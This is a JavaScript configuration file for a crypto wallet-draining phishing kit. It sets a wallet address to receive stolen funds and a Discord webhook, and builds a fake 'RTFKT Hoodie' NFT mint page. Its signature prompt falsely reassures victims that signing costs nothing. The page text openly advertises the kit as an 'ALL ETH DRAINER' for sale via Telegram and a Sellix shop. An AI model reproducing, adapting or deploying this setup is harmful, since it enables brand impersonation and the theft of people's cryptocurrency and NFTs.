const receiveAddress = "0x36B580C55096A454764177EB961147e01cE054D3";
const discordWebhookURL = "webhook url"

const collectionInfo = {
    name: "RTFKT Hoodie",
    socialMedia: {
        discord: "https://Tec.sellix.io",
        twitter: "https://Tec.sellix.io",
        instagram: "https://Tec.sellix.io",
    },
}

const signMessage = `Welcome, \n\n` +
    `Click to sign in and accept the Terms of Service.\n\n` +
    `This request will not trigger a blockchain transaction or cost any gas fees.\n\n` +
    `Wallet Address:\n{address}\n\n` +
    `Nonce:\n{nonce}`;

const indexPageInfo = {
    backgroundImage: "background.gif", // relative path to background image (in assets)
    title: "{name}", // {name} will be replaced with collectionInfo.name
    underTitle: "Buy now your Drainer!",
}

const claimPageInfo = {
    title: "RTFKT<br>Hoodie", // <br> is a line break
    shortDescription: "NFTs + ALL ETH DRAINER.",
    longDescription: "CONTACT ME ON TELEGRAM TO BUY THIS DRAINER @TecOnSellix",

    claimButtonText: "CLAIM NOW",

    image: "pic.gif", // relative path to image (in assets)
    imageRadius: 250, // image radius in px
}

const customStrings = {
    title: "MINT {name}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    connectButton: "Connect wallet",
    transferButton: "Mint now",
    dateString: "Pre sale available {date}", // Date string (ex "Pre sale available {date}") - You can use {date} to insert the collection date
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (!receiveAddress.startsWith("0x") || (receiveAddress.length >= 64 || receiveAddress.length <= 40))
    console.error(`Error: ${receiveAddress} is not a valid Ethereum address.`);
//#endregion
